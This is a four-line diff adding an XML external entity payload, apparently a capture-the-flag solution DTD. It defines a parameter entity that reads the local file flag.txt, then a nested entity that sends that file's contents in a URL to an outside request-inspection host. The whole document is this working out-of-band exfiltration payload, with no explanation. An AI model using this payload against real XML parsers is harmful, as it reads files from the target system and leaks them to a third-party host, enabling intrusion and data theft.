@@ -1,0 +1,4 @@
+<!ENTITY % payload SYSTEM "file:///flag.txt"><!--  <E> -->
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://requestinspector.com/inspect/01eq8sych6v5bgd2r98q15t2h3?%payload;" >'><!--  <F> -->
+%param1;<!--  <G> -->
+%external; <!--  <H> -->
